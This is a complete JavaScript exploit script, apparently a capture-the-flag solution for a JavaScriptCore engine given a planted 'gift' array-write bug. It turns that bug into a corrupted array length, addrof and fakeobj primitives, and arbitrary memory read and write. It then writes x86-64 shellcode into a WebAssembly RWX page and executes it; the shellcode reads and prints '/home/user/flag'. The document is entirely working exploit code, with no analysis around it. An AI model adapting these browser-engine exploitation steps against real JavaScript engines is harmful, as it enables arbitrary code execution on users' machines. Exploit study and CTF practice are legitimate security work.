let buf = new ArrayBuffer(8);
let f64 = new Float64Array(buf);
let u64 = new BigUint64Array(buf);

function itof(x) {
    u64[0] = x;
    return f64[0];
};

function ftoi(x) {
    f64[0] = x;
    return u64[0];
};

// gift is a limited WWW primitive

// distance between the value of the 2 butterflies is 0x30 bytes (6 doubles)
let float_arr = [1.1, 2.2];
let arr = [1.1, 2.2];
let contig = [1.1, 2.2];

// rwa[0] = Structure ID + Header
// rwa[1] = butterfly
let rwa = {header: 1.1, butterfly: float_arr};

// break CoW (float_arr, arr and contig share the same butterfly)
float_arr[0] = 1.1;
arr[0] = 1.1;
contig[0] = {};

// overwrite arr.length
float_arr.gift(5, itof(0x00000100ffffffffn));
print("corrupted array size: 0x" + arr.length.toString(16));

function addrof(x) {
    contig[0] = x;
    return ftoi(arr[6]);
};

function fakeobj(addr) {
    arr[6] = itof(addr);
    return contig[0];
};

rwa.header = itof(0x0000000700000000n);
rwa.butterfly = fakeobj(addrof(float_arr) + 0x8n);

print("address of float_arr: 0x" + addrof(float_arr).toString(16));
print("address of arr: 0x" + addrof(arr).toString(16));
print("address of rwa: 0x" + addrof(rwa).toString(16));

let fake = fakeobj(addrof(rwa) + 0x10n);
print("fake object: 0x" + addrof(fake).toString(16));

function read64(addr, offset = 0) {
    fake[0] = itof(addr);
    return ftoi(float_arr[offset]);
};

function write64(addr, value, offset = 0) {
    fake[0] = itof(addr);
    float_arr[offset] = itof(value);
};

rwa.header = itof(read64(addrof(arr) - 0x8n, 1)); // fix fake's header so the gc doesn't crash the entire process

let wasm_code = new Uint8Array([
    0x00, 0x61, 0x73, 0x6d,  // magic
    0x01, 0x00, 0x00, 0x00,  // version
    0x01, 0x05, 0x01, 0x60, 0x00, 0x01, 0x7f,  // type section: () -> i32
    0x03, 0x02, 0x01, 0x00,  // function section
    0x07, 0x05, 0x01, 0x01, 0x66, 0x00, 0x00,  // export "f"
    0x0a, 0x06, 0x01, 0x04, 0x00, 0x41, 0x2a, 0x0b  // code: return 42
]);
let wasm_mod = new WebAssembly.Module(wasm_code);
let wasm_instance = new WebAssembly.Instance(wasm_mod);
let wasm_func = wasm_instance.exports.f;
let wasm_func_addr = addrof(wasm_func);
let rwx_page = read64(read64(wasm_func_addr + 0x30n)+0x40n) - 0x32000n;
print("address of wasm_func: 0x" + wasm_func_addr.toString(16));
print("address of rwx page: 0x" + rwx_page.toString(16));

let shellcode = [
    0x48000000403d8d48n,
    0x000002c0c748f631n,
    0x8948c78948050f00n,
    0x00001000c2c748e6n,
    0xc28948050fc03148n,
    0x4800000001c7c748n,
    0x000001c0c748e689n,
    0xc748ff3148050f00n,
    0x2f050f000000e7c0n,
    0x6573752f656d6f68n,
    0x900067616c662f72n,
];

for(let i = 0; i < shellcode.length; i++){
    write64(rwx_page + 0x2e000n + BigInt(i*8), shellcode[i]);
    print("wrote 0x" + shellcode[i].toString(16) + " to 0x" + (rwx_page + 0x2e000n + BigInt(i*8)).toString(16));
    print("test read: 0x" + read64(rwx_page + 0x2e000n + BigInt(i*8)).toString(16));
};

wasm_instance.exports.f();
